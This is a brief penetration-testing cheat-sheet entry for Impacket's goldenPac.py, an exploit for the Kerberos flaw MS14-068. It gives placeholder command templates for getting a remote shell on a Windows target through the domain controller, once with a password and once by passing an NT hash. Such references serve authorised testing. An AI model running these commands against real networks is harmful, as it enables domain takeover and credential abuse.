# goldenPac (imp)

% impacket-kerberos, windows, kerberos, 88, goldenPAC, MS14-068

#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 

## desc
```
MS14-068 Exploit. It establishes a SMBConnection and PSEXEcs the target or saves the TGT for later
use.
```

## connect (creds)
```bash
goldenPac.py -dc-ip <dc_ip> <domain_fqdn>/<user>:'<password>'@<target_fqdn>
```

## connect (pth)
```bash
goldenPac.py -dc-ip <dc_ip> <domain_fqdn>/-hashes :<nt_hash> <domain_fqdn>/<user>@<target_fqdn>
```